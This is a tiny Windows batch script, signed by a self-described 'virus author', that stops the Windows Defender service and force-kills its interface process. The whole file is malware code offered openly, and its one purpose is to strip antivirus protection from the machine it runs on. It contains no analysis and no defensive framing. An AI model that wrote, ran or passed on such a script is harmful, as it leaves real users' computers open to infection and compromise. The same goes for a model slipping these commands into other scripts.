@ echo off

rem ---------------------------------
rem Disable Windows Defender
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
rem ---------------------------------


__-Virus Author: subhojit-__